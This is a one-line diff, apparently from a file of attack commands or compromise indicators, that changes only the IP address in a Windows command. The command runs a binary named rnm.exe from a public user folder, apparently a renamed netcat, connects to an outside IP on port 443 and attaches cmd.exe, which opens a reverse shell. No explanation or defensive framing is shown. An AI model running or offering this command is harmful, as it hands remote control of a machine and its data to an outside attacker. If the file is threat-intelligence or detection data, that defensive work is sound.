@@ -1,1 +1,1 @@
-c:\users\public\rnm.exe -nv 181.173.54.51 443 -e cmd.exe
+c:\users\public\rnm.exe -nv 181.173.50.151 443 -e cmd.exe
